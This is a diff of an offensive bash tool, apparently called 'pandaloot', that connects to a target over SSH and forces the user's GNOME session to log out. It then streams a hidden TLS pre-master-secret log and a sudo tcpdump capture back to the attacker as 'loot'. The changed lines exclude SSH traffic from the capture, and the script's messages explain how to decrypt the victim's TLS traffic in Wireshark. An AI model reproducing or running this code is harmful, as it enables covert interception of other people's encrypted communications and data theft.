@@ -63,7 +63,7 @@ remote_host_pw() {
     sleep 5
     sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'gnome-session-quit --no-prompt' &
     sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'tail -f /tmp/.update.log' >> /tmp/pandaloot/keyloot.log &
-    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} "echo ${PASS} | sudo -S tcpdump -s0 -U -n -w -" > /tmp/loot & 
+    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} "echo ${PASS} | sudo -S tcpdump -s0 -U -n -w - not port 22" > /tmp/loot & 
     echo -e "\n${bred}Add the local copy of keyloot.log to wireshark located in /tmp/pandaloot/keyloot.log${uncolor}"
     echo -e "${blue}In Wireshark: Edit > Preferences > Protocols > TLS > Pre-Master Secret log filename\n"
     echo -e "Everything should be running. Press Ctrl + C to stop everything.${uncolor}"
@@ -74,7 +74,7 @@ remote_host_rsa() {
     sleep 5
     ssh -i ${KEYFILE} ${TARGET} 'gnome-session-quit --no-prompt'
     ssh -i ${KEYFILE} ${TARGET} 'tail -f /tmp/.update.log' >> /tmp/pandaloot/keyloot.log &
-    ssh -i ${KEYFILE} ${TARGET} 'sudo tcpdump -s0 -U -n -w -' > /tmp/loot &
+    ssh -i ${KEYFILE} ${TARGET} 'sudo tcpdump -s0 -U -n -w - not port 22' > /tmp/loot &
     echo -e "\n${bred}Add the local copy of keyloot.log to wireshark located in /tmp/pandaloot/keyloot.log${uncolor}"
     echo -e "${blue}In Wireshark: Edit > Preferences > Protocols > TLS > Pre-Master Secret log filename${uncolor}\n"
     echo -e "${yellow}Everything should be running. Press Ctrl + C to stop everything.${uncolor}"
